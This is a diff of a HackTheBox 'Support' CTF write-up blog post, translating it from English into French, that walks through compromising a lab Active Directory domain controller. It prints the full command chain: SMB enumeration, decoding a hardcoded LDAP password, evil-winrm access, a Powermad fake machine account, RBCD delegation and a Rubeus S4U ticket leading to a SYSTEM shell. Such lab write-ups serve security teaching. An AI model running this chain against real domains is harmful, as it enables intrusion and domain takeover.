@@ -1,21 +1,21 @@
 ---
 layout: post
 title: "Support - HackTheBox WriteUp"
-date: 2022-12-14
+date: 2025-10-18
 categories: [CTF, HackTheBox, WriteUp]
 tags: [Windows, SMB, LDAP, ReverseEngineering, ActiveDirectory, BloodHound, RBCD, PrivEsc, WinRM, Kerberos]
-difficulty: Medium
+difficulty: Easy
 platform: HackTheBox
 author: Aubin SABY
-lang: en
-permalink: /en/blog/2022/12/14/support-htb-writeup/
-excerpt: "Windows Active Directory machine with anonymous SMB share. Reverse engineering a .NET binary to extract LDAP credentials, then RBCD exploitation via BloodHound for complete domain compromise."
+lang: fr
+permalink: /fr/blog/2022/12/14/support-htb-writeup/
+excerpt: "Machine Windows Active Directory avec partage SMB anonyme. Reverse engineering d'un binaire .NET pour extraire des credentials LDAP, puis exploitation RBCD via BloodHound pour compromission complète du domaine."
 ---
 
-<div class="bg-gradient-to-r from-orange-500/10 to-red-500/10 p-8 rounded-xl mb-12 border-l-4 border-orange-500 shadow-lg">
-    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
+<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-10 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
+    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-8 gap-6">
         <div class="flex-1">
-            <h2 class="text-4xl md:text-5xl font-bold text-orange-500 mb-3">
+            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                 <i class="fas fa-cube mr-3"></i>Support
             </h2>
             <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
@@ -23,108 +23,153 @@ excerpt: "Windows Active Directory machine with anonymous SMB share. Reverse eng
             </p>
         </div>
         <div class="flex gap-3">
-            <span class="px-5 py-2 bg-orange-500 text-white rounded-lg text-sm font-semibold shadow-md">
-                <i class="fas fa-circle text-xs mr-1"></i>Medium
+            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
+                <i class="fas fa-circle text-xs mr-1"></i>Easy
             </span>
-            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
+            <span class="px-5 py-2 bg-blue-600 text-white rounded-lg text-sm font-semibold shadow-md">
                 <i class="fab fa-windows mr-1"></i>Windows
             </span>
         </div>
     </div>
-    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
-        <div class="flex items-center gap-2">
-            <i class="fas fa-calendar text-orange-500"></i>
+
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-6">
+        <div class="flex items-center gap-3">
+            <div class="text-green-500 text-xl">
+                <i class="fas fa-calendar"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">12/14/2022</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Date</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">2025-10-18</div>
             </div>
         </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-network-wired text-blue-500"></i>
+
+        <div class="flex items-center gap-3">
+            <div class="text-blue-500 text-xl">
+                <i class="fas fa-network-wired"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Target IP</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">10.129.178.26</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">IP</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">10.129.178.26</div>
             </div>
         </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-shield-alt text-purple-500"></i>
+
+        <div class="flex items-center gap-3">
+            <div class="text-purple-500 text-xl">
+                <i class="fas fa-shield-alt"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">Windows Server</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">OS</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">Windows Server</div>
             </div>
         </div>
-        <div class="flex items-center gap-2">
-            <i class="fas fa-star text-amber-500"></i>
+
+        <div class="flex items-center gap-3">
+            <div class="text-amber-500 text-xl">
+                <i class="fas fa-star"></i>
+            </div>
             <div>
-                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
-                <div class="font-semibold text-gray-800 dark:text-gray-200">30</div>
+                <div class="text-xs uppercase tracking-wide text-gray-600 dark:text-gray-400">Points</div>
+                <div class="font-semibold text-gray-800 dark:text-gray-100 text-lg">30</div>
             </div>
         </div>
     </div>
 </div>
 
+
 ## 🎯 Synopsis
 
-**Support** is a <span class="text-highlight-orange">**medium difficulty Windows machine**</span> implementing an <span class="text-highlight-red">**Active Directory**</span> environment.
+**Support** est une machine <span class="text-highlight-green">**Windows de difficulté facile**</span> mettant en œuvre un environnement <span class="text-highlight-red">**Active Directory**</span>.
 
-An <span class="text-highlight-blue">**anonymous SMB share**</span> reveals a .NET binary capable of connecting to an LDAP server. Through <span class="text-highlight-purple">**reverse engineering**</span> or network analysis, the LDAP account password is discovered, allowing user enumeration. The `support` account contains its own password in the `info` attribute, leading to <span class="text-highlight-green">**WinRM connection**</span>. Through <span class="text-highlight-orange">**BloodHound**</span> analysis, we discover that the *Shared Support Accounts* group has <span class="text-highlight-red">**GenericAll**</span> privileges on the domain controller, opening the way for a <span class="text-highlight-purple">**Resource-Based Constrained Delegation (RBCD)**</span> and complete domain compromise.
+Un <span class="text-highlight-blue">**partage SMB anonyme**</span> révèle un binaire .NET capable de se connecter à un serveur LDAP. Par <span class="text-highlight-purple">**ingénierie inverse**</span> ou analyse réseau, le mot de passe du compte LDAP est découvert et permet d'énumérer les utilisateurs. Le compte `support` contient son propre mot de passe dans l'attribut `info`, menant à une <span class="text-highlight-green">**connexion WinRM**</span>. Grâce à l'analyse <span class="text-highlight-orange">**BloodHound**</span>, on découvre que le groupe *Shared Support Accounts* possède des privilèges <span class="text-highlight-red">**GenericAll**</span> sur le contrôleur de domaine, ouvrant la voie à une <span class="text-highlight-purple">**Resource-Based Constrained Delegation (RBCD)**</span> et une compromission complète du domaine.
 
-<div class="grid md:grid-cols-2 gap-6 my-10">
+<div class="grid md:grid-cols-2 gap-6 my-4">
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
         <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
-            <i class="fas fa-brain mr-2"></i>Required Skills
+            <i class="fas fa-brain mr-2"></i>Compétences requises
         </h3>
         <ul class="space-y-2 text-gray-700 dark:text-gray-300">
-            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic Windows knowledge</li>
-            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Fundamental Active Directory principles</li>
-            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Understanding of LDAP and SMB</li>
-            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic reverse engineering notions</li>
+            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Connaissances de base Windows</li>
+            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Principes fondamentaux Active Directory</li>
+            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Compréhension LDAP et SMB</li>
+            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Notions de base en reverse engineering</li>
         </ul>
     </div>
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
         <h3 class="text-2xl font-bold text-cyan-500 mb-4">
-            <i class="fas fa-rocket mr-2"></i>Skills Acquired
+            <i class="fas fa-rocket mr-2"></i>Compétences acquises
         </h3>
         <ul class="space-y-2 text-gray-700 dark:text-gray-300">
-            <li><i class="fas fa-star text-amber-500 mr-2"></i>Anonymous SMB access and enumeration</li>
-            <li><i class="fas fa-star text-amber-500 mr-2"></i>.NET decompilation with ILSpy</li>
-            <li><i class="fas fa-star text-amber-500 mr-2"></i>LDAP queries and AD enumeration</li>
-            <li><i class="fas fa-star text-amber-500 mr-2"></i>BloodHound analysis for privilege mapping</li>
-            <li><i class="fas fa-star text-amber-500 mr-2"></i>RBCD Attack exploitation for SYSTEM shell</li>
+            <li><i class="fas fa-star text-amber-500 mr-2"></i>Accès SMB anonyme et énumération</li>
+            <li><i class="fas fa-star text-amber-500 mr-2"></i>Décompilation .NET avec ILSpy</li>
+            <li><i class="fas fa-star text-amber-500 mr-2"></i>Requêtes LDAP et énumération AD</li>
+            <li><i class="fas fa-star text-amber-500 mr-2"></i>Analyse BloodHound pour cartographie des privilèges</li>
+            <li><i class="fas fa-star text-amber-500 mr-2"></i>Exploitation RBCD Attack pour shell SYSTEM</li>
         </ul>
     </div>
 </div>
 
 
-## 🔍 Phase 1 — Initial Reconnaissance
+## 🔍 Phase 1 — Reconnaissance initiale
 
-### Full Port Scan
+### Scan de ports complet
+
+Scan approfondi pour identifier les services exposés :
 
 ```bash
 nmap -sC -sV -Pn 10.129.178.26
 ```
 
-Key services discovered: **Port 445 (SMB)**, **389/636 (LDAP)**, **5985 (WinRM)**.
+<div class="bg-white dark:bg-dark-navbar p-5 rounded-xl shadow-lg my-4">
+    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
+        <i class="fas fa-search mr-2"></i>Résultats du scan
+    </h4>
+    <div class="space-y-3">
+        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
+            <div class="text-3xl text-blue-500">
+                <i class="fas fa-folder-open"></i>
+            </div>
+            <div class="flex-1">
+                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 445/TCP - SMB</div>
+                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Microsoft-DS (partages réseau)</div>
+                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Potentiel accès anonyme</div>
+            </div>
+        </div>
+        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
+            <div class="text-3xl text-green-500">
+                <i class="fas fa-address-book"></i>
+            </div>
+            <div class="flex-1">
+                <div class="font-bold text-lg text-green-600 dark:text-green-400">Ports 389/636 - LDAP/LDAPS</div>
+                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Service d'annuaire Active Directory</div>
+                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Point d'énumération critique</div>
+            </div>
+        </div>
+    </div>
+</div>
 
 <div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
     <p class="text-cyan-800 dark:text-cyan-200">
         <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
-        <strong>Analysis:</strong> Windows system, likely Active Directory domain controller.
+        <strong>Analyse :</strong> Système Windows, probablement contrôleur de domaine Active Directory.
     </p>
 </div>
 
 
-## 📁 Phase 2 — SMB Enumeration
+## 📁 Phase 2 — Énumération SMB
 
-### Share Listing
+### Listing des partages
 
 ```bash
 smbclient -L \\\\10.129.178.26\\
 ```
 
-Accessible share: **support-tools**
+Partage accessible :
 
-Download suspicious file:
+```
+support-tools
+```
+
+Téléchargement du fichier suspect :
 
 ```bash
 smbclient \\\\10.129.178.26\\support-tools
@@ -134,12 +179,12 @@ unzip UserInfo.exe.zip
 file UserInfo.exe
 ```
 
-.NET application identified.
+Application .NET identifiée.
 
 
 ## 🧠 Phase 3 — Reverse Engineering
 
-### Decompilation with ILSpy
+### Décompilation avec ILSpy
 
 ```bash
 wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
@@ -148,14 +193,14 @@ cd artifacts/linux-x64
 ./ILSpy
 ```
 
-Decompiled source reveals:
+Code source décompilé révèle :
 
 ```csharp
 private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
 private static byte[] key = Encoding.ASCII.GetBytes("armando");
 ```
 
-### Python Decryption
+### Déchiffrement Python
 
 ```python
 import base64
@@ -174,20 +219,20 @@ print(res)
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold">
         <i class="fas fa-key mr-2 text-green-500"></i>
-        LDAP password: <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>
+        Mot de passe LDAP : <code>nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</code>
     </p>
 </div>
 
 
-## 🧩 Phase 4 — LDAP Connection
+## 🧩 Phase 4 — Connexion LDAP
 
-Configure hosts:
+Configuration hosts :
 
 ```bash
 echo '10.129.178.26 support.htb' | sudo tee -a /etc/hosts
 ```
 
-LDAP connection:
+Connexion LDAP :
 
 ```bash
 ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
@@ -196,14 +241,14 @@ ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPW
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-check-circle mr-2 text-green-500"></i>
-        LDAP connection successful\! Active Directory enumeration possible.
+        Connexion LDAP réussie ! Énumération des objets Active Directory possible.
     </p>
 </div>
 
 
-## 🧍 Phase 5 — Support Account Discovery
+## 🧍 Phase 5 — Découverte du compte support
 
-In CN=Users, the support object contains:
+Dans CN=Users, l'objet support contient :
 
 ```
 info: Ironside47pleasure40Watchful
@@ -213,14 +258,14 @@ memberOf: Remote Management Users
 <div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
     <p class="text-amber-800 dark:text-amber-200">
         <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
-        <strong>Plaintext password found\!</strong> Remote Management Users group allows WinRM connection.
+        <strong>Mot de passe en clair trouvé !</strong> Le groupe Remote Management Users permet la connexion WinRM.
     </p>
 </div>
 
 
-## 💻 Phase 6 — Initial WinRM Access
+## 💻 Phase 6 — Accès initial WinRM
 
-Connection:
+Connexion :
 
 ```bash
 evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
@@ -229,53 +274,57 @@ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-terminal mr-2 text-green-500"></i>
-        Shell obtained as support@support.htb\!
+        Shell obtenu en tant que support@support.htb !
     </p>
 </div>
 
-User flag:
+Flag utilisateur :
 
 ```powershell
 type C:\Users\Support\Desktop\user.txt
 ```
 
 
-## 🧭 Phase 7 — Domain Enumeration
+## 🧭 Phase 7 — Énumération du domaine
 
-List domain:
+Lister le domaine :
 
 ```powershell
 Get-ADDomain
 ```
 
-User groups:
+Groupes de l'utilisateur :
 
 ```powershell
 whoami /groups
 ```
 
-Notable result: **Shared Support Accounts** (non-standard group)
+Résultat notable :
+
+```
+Shared Support Accounts (groupe non standard)
+```
 
 <div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
     <p class="text-amber-800 dark:text-amber-200">
         <i class="fas fa-search mr-2 text-amber-500"></i>
-        <strong>Hypothesis:</strong> This custom group potentially holds elevated privileges on the domain.
+        <strong>Hypothèse :</strong> Ce groupe personnalisé détient potentiellement des privilèges élevés sur le domaine.
     </p>
 </div>
 
 
-## 🕸️ Phase 8 — BloodHound Analysis
+## 🕸️ Phase 8 — Analyse BloodHound
 
-### Start Neo4j and BloodHound
+### Démarrage de Neo4j et BloodHound
 
 ```bash
 sudo neo4j start
 ./BloodHound-linux-x64/BloodHound
 ```
 
-### Data Collection
+### Collecte de données
 
-In Evil-WinRM:
+Dans Evil-WinRM :
 
 ```powershell
 cd C:\Windows\Temp
@@ -284,34 +333,34 @@ upload SharpHound.exe
 download *.zip
 ```
 
-Import into BloodHound and mark SUPPORT@SUPPORT.HTB as "Owned".
+Importer dans BloodHound et marquer SUPPORT@SUPPORT.HTB comme "Owned".
 
-### Analysis Result
+### Résultat de l'analyse
 
 <div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
     <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
-        <i class="fas fa-crown mr-2"></i>Critical Privilege Discovered
+        <i class="fas fa-crown mr-2"></i>Privilège critique découvert
     </h4>
     <p class="text-gray-700 dark:text-gray-300 mb-2">
-        The <strong>Shared Support Accounts</strong> group has <span class="text-highlight-red">GenericAll</span> on the domain controller DC.SUPPORT.HTB
+        Le groupe <strong>Shared Support Accounts</strong> possède <span class="text-highlight-red">GenericAll</span> sur le contrôleur de domaine DC.SUPPORT.HTB
     </p>
     <p class="text-sm text-gray-600 dark:text-gray-400">
-        This permission allows an RBCD (Resource-Based Constrained Delegation) attack to obtain a SYSTEM shell.
+        Cette permission permet une attaque RBCD (Resource-Based Constrained Delegation) pour obtenir un shell SYSTEM.
     </p>
 </div>
 
 
-## ⚙️ Phase 9 — RBCD Exploitation
+## ⚙️ Phase 9 — Exploitation RBCD
 
-### Check Machine Quota
+### Vérifier le quota machine
 
 ```powershell
 Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
 ```
 
-Result: 10 (any authenticated user can create up to 10 machines).
+Résultat : 10 (n'importe quel utilisateur authentifié peut créer jusqu'à 10 machines).
 
-### Import PowerView
+### Importer PowerView
 
 ```powershell
 upload PowerView.ps1
@@ -319,7 +368,7 @@ upload PowerView.ps1
 Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
 ```
 
-### Create Fake Machine
+### Créer une fausse machine
 
 ```powershell
 upload Powermad.ps1
@@ -327,7 +376,7 @@ upload Powermad.ps1
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 ```
 
-Verification:
+Vérification :
 
 ```powershell
 Get-ADComputer -Identity FAKE-COMP01
@@ -336,26 +385,26 @@ Get-ADComputer -Identity FAKE-COMP01
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold">
         <i class="fas fa-check-circle mr-2 text-green-500"></i>
-        Machine FAKE-COMP01 successfully created\!
+        Machine FAKE-COMP01 créée avec succès !
     </p>
 </div>
 
-### Configure Delegation
+### Configurer la délégation
 
 ```powershell
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
 ```
 
-### S4U Attack with Rubeus
+### S4U Attack avec Rubeus
 
-RC4 hash:
+Hash RC4 :
 
 ```powershell
 upload Rubeus.exe
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 ```
 
-Execution:
+Exécution :
 
 ```powershell
 .\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
@@ -364,14 +413,14 @@ Execution:
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-lg">
         <i class="fas fa-ticket-alt mr-2 text-green-500"></i>
-        Kerberos ticket for Administrator generated and injected\!
+        Ticket Kerberos pour Administrator généré et injecté !
     </p>
 </div>
 
 
-## 👑 Phase 10 — SYSTEM Shell
+## 👑 Phase 10 — Shell SYSTEM
 
-Ticket conversion and usage:
+Conversion et utilisation du ticket :
 
 ```bash
 base64 -d ticket.kirbi.b64 > ticket.kirbi
@@ -382,11 +431,11 @@ KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -
 <div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
     <p class="text-green-800 dark:text-green-200 font-bold text-xl">
         <i class="fas fa-crown mr-2 text-amber-500"></i>
-        NT AUTHORITY\SYSTEM obtained\!
+        NT AUTHORITY\SYSTEM obtenu !
     </p>
 </div>
 
-Root flag:
+Flag root :
 
 ```
 C:\Users\Administrator\Desktop\root.txt
@@ -398,19 +447,19 @@ C:\Users\Administrator\Desktop\root.txt
             <i class="fas fa-trophy"></i>
         </div>
         <div class="flex-1">
-            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
+            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned!</h4>
             <p class="text-gray-700 dark:text-gray-300">
-                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> C:\Users\Support\Desktop\user.txt<br>
-                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> C:\Users\Administrator\Desktop\root.txt
+                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag :</strong> C:\Users\Support\Desktop\user.txt<br>
+                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag :</strong> C:\Users\Administrator\Desktop\root.txt
             </p>
         </div>
     </div>
 </div>
 
 
-## 📋 Phase 11 — Recommendations
+## 📋 Phase 11 — Recommandations
 
-<div class="grid md:grid-cols-2 gap-6 my-8">
+<div class="grid md:grid-cols-2 gap-6 my-4">
     <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
         <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
             <i class="fas fa-folder-open mr-2"></i>SMB & LDAP
@@ -418,15 +467,15 @@ C:\Users\Administrator\Desktop\root.txt
         <ul class="space-y-3 text-gray-700 dark:text-gray-300">
             <li class="flex items-start gap-2">
                 <i class="fas fa-check text-green-500 mt-1"></i>
-                <span>Remove anonymous SMB access</span>
+                <span>Supprimer l'accès SMB anonyme</span>
             </li>
             <li class="flex items-start gap-2">
                 <i class="fas fa-check text-green-500 mt-1"></i>
-                <span>Never store plaintext passwords in LDAP attributes</span>
+                <span>Ne jamais stocker de mots de passe en clair dans les attributs LDAP</span>
             </li>
             <li class="flex items-start gap-2">
                 <i class="fas fa-check text-green-500 mt-1"></i>
-                <span>Enable LDAP & Kerberos logging</span>
+                <span>Activer la journalisation LDAP & Kerberos</span>
             </li>
         </ul>
     </div>
@@ -437,15 +486,15 @@ C:\Users\Administrator\Desktop\root.txt
         <ul class="space-y-3 text-gray-700 dark:text-gray-300">
             <li class="flex items-start gap-2">
                 <i class="fas fa-check text-green-500 mt-1"></i>
-                <span>Restrict GenericAll privileges</span>
+                <span>Restreindre les privilèges GenericAll</span>
             </li>
             <li class="flex items-start gap-2">
                 <i class="fas fa-check text-green-500 mt-1"></i>
-                <span>Control ms-DS-MachineAccountQuota</span>
+                <span>Contrôler ms-DS-MachineAccountQuota</span>
             </li>
             <li class="flex items-start gap-2">
                 <i class="fas fa-check text-green-500 mt-1"></i>
-                <span>AD privilege segmentation</span>
+                <span>Segmentation des privilèges AD</span>
             </li>
         </ul>
     </div>
@@ -453,142 +502,142 @@ C:\Users\Administrator\Desktop\root.txt
 
 ---
 
-## 📝 Command Summary
+## 📝 Récapitulatif des commandes
 
-### 🔍 Phase 1: Reconnaissance & Initial Access (Linux)
+### 🔍 Phase 1 : Reconnaissance & Accès Initial (Linux)
 
 ```bash
-# 1. Network scan
+# 1. Scan réseau
 nmap -sC -sV -Pn 10.129.178.26
 
-# 2. SMB enumeration
+# 2. Énumération SMB
 smbclient -L \\\\10.129.178.26\\
 smbclient \\\\10.129.178.26\\support-tools
-# → Download UserInfo.exe.zip
+# → Télécharger UserInfo.exe.zip
 
-# 3. LDAP password decryption (after reverse engineering)
+# 3. Déchiffrement du mot de passe LDAP (après reverse engineering)
 python3 decrypt.py
-# → Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+# → Mot de passe : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 
-# 4. LDAP query to enumerate users
+# 4. Requête LDAP pour énumérer les utilisateurs
 ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
-# → Find 'support' password in 'info' attribute
+# → Trouve le mot de passe de 'support' dans l'attribut 'info'
 
-# 5. WinRM connection with support user
+# 5. Connexion WinRM avec l'utilisateur support
 evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 ```
 
-### 🔐 Phase 2: AD Enumeration (PowerShell on target)
+### 🔐 Phase 2 : Énumération AD (PowerShell sur la cible)
 
 ```powershell
-# 1. Check domain and groups
+# 1. Vérifier le domaine et les groupes
 Get-ADDomain
 whoami /groups
-# → Member of 'Shared Support Accounts'
+# → Membre de 'Shared Support Accounts'
 
-# 2. Check machine creation quota
+# 2. Vérifier le quota de création de machines
 Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
-# → Quota = 10 (we can create machines)
+# → Quota = 10 (on peut créer des machines)
 ```
 
-### 🕸️ Phase 3: BloodHound Collection (PowerShell)
+### 🕸️ Phase 3 : Collecte BloodHound (PowerShell)
 
 ```powershell
-# 1. Navigate to writable directory
+# 1. Se placer dans un dossier avec droits d'écriture
 cd C:\Windows\Temp
 
-# 2. Upload and execute SharpHound
+# 2. Upload et exécution de SharpHound
 upload SharpHound.exe
 .\SharpHound.exe
 
-# 3. Download results
+# 3. Télécharger les résultats
 download *.zip
 ```
 
-### ⚙️ Phase 4: RBCD Attack (PowerShell)
+### ⚙️ Phase 4 : RBCD Attack (PowerShell)
 
 ```powershell
-# 1. Upload and import PowerView
+# 1. Upload et import de PowerView
 upload PowerView.ps1
 . ./PowerView.ps1
 
-# 2. Check current delegations
+# 2. Vérifier les délégations actuelles
 Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
 
-# 3. Create fake machine with Powermad
+# 3. Créer une fausse machine avec Powermad
 upload Powermad.ps1
 . ./Powermad.ps1
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 
-# 4. Verify creation
+# 4. Vérifier la création
 Get-ADComputer -Identity FAKE-COMP01
 
-# 5. Configure delegation on DC
+# 5. Configurer la délégation sur le DC
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
 ```
 
-### 🎫 Phase 5: Kerberos Ticket Generation (PowerShell)
+### 🎫 Phase 5 : Génération du ticket Kerberos (PowerShell)
 
 ```powershell
 # 1. Upload Rubeus
 upload Rubeus.exe
 
-# 2. Generate RC4 hash
+# 2. Générer le hash RC4
 .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
 # → RC4: 58A478135A93AC3BF058A5EA0E8FDB71
 
-# 3. Execute S4U attack to impersonate Administrator
+# 3. Exécuter l'attaque S4U pour usurper Administrator
 .\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
-# → Copy generated base64 ticket
+# → Copier le ticket base64 généré
 ```
 
-### 👑 Phase 6: SYSTEM Shell (Linux)
+### 👑 Phase 6 : Shell SYSTEM (Linux)
 
 ```bash
-# 1. Convert Kerberos ticket
+# 1. Conversion du ticket Kerberos
 base64 -d ticket.kirbi.b64 > ticket.kirbi
 ticketConverter.py ticket.kirbi ticket.ccache
 
-# 2. Use ticket to get Administrator shell
+# 2. Utilisation du ticket pour obtenir un shell Administrator
 export KRB5CCNAME=ticket.ccache
 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
-# → NT AUTHORITY\SYSTEM obtained!
+# → NT AUTHORITY\SYSTEM obtenu !
 ```
 
 ---
 
-## 🔗 Attack Chain Summary
+## 🔗 Chaîne d'attaque résumée
 
-<div class="bg-white dark:bg-dark-navbar p-8 rounded-xl shadow-lg my-8">
-    <h3 class="text-2xl font-bold text-portfolio-violet mb-6 flex items-center">
-        <i class="fas fa-project-diagram mr-3"></i>Complete Attack Path
+<div class="bg-white dark:bg-dark-navbar px-6 py-5 rounded-xl shadow-lg my-8">
+    <h3 class="text-2xl font-bold text-portfolio-violet mb-4 flex items-center">
+        <i class="fas fa-project-diagram mr-3"></i>Parcours d'attaque complet
     </h3>
     <div class="space-y-4">
-        <div class="flex items-center gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
-            <div class="text-3xl font-bold text-blue-500">1</div>
+        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
+            <div class="text-3xl font-bold text-blue-500 mt-1">1</div>
             <div class="flex-1">
-                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and SMB Access</div>
-                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → Anonymous SMB → UserInfo.exe.zip</div>
+                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance et accès SMB</div>
+                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → SMB anonyme → UserInfo.exe.zip</div>
             </div>
         </div>
-        <div class="flex items-center gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
